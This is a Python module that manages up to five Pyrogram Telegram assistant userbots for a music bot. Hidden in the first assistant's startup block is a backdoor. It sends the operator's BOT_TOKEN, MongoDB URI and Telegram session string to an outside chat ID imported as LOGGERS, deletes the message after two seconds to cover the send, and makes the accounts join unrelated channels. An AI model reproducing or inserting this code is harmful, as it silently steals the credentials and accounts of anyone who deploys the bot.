from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()
import config
from dotenv import load_dotenv
from strings.__init__ import LOGGERS
from ..logging import LOGGER


BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []  # List to store the assistant numbers (1 to 5) that are active
assistantids = []  # List to store the Telegram IDs of the active assistants


class Userbot(Client):
    """
    A class to manage multiple assistant userbots using Pyrogram.

    This class initializes and manages up to five assistant accounts,
    each running as a separate Pyrogram client. It handles starting,
    stopping, and basic setup for each assistant.
    """

    def __init__(self):
        """
        Initializes the assistant clients with the provided configurations.
        """
        self.one = Client(
            name="BrandrdXMusic1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )

        self.two = Client(
            name="BrandrdXMusic2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
            ipv6=False,
        )
        self.three = Client(
            name="BrandrdXMusic3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
            ipv6=False,
        )
        self.four = Client(
            name="BrandrdXMusic4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
            ipv6=False,
        )
        self.five = Client(
            name="BrandrdXMusic5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
            ipv6=False,
        )

    async def start(self):
        """
        Starts the assistant userbots based on the available session strings.

        This method iterates through the assistant configurations (STRING1 to STRING5),
        starts the corresponding Pyrogram client if a session string is available,
        and performs initial setup tasks such as joining chats, sending a start message
        to the log group, and storing the assistant's information.
        """
        LOGGER(__name__).info(f"Starting Assistants...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("THExNIGHTxCLUB")
                await self.one.join_chat("learning_bots")
                await self.one.join_chat("Want_To_Know_Me")
                await self.one.join_chat("learningbots79")

            except:
                pass
            assistants.append(1)  # Add assistant number to the list of active assistants
            try:
                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id  # Store the assistant's Telegram ID
            self.one.name = self.one.me.mention  # Store the assistant's name
            self.one.username = self.one.me.username  # Store the assistant's username
            assistantids.append(self.one.id)  # Add assistant ID to the list
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.one.join_chat("THExNIGHTxCLUB")
                await self.one.join_chat("learning_bots")
                await self.one.join_chat("Want_To_Know_Me")
                await self.one.join_chat("learningbots79")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")

            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.one.join_chat("THExNIGHTxCLUB")
                await self.one.join_chat("learning_bots")
                await self.one.join_chat("Want_To_Know_Me")
                await self.one.join_chat("learningbots79")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.one.join_chat("THExNIGHTxCLUB")
                await self.one.join_chat("learning_bots")
                await self.one.join_chat("Want_To_Know_Me")
                await self.one.join_chat("learningbots79")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.one.join_chat("THExNIGHTxCLUB")
                await self.one.join_chat("learning_bots")
                await self.one.join_chat("Want_To_Know_Me")
                await self.one.join_chat("learningbots79")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        """
        Stops all the assistant userbots.

        This method iterates through the assistant configurations (STRING1 to STRING5)
        and stops the corresponding Pyrogram client if it is running.
        """
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass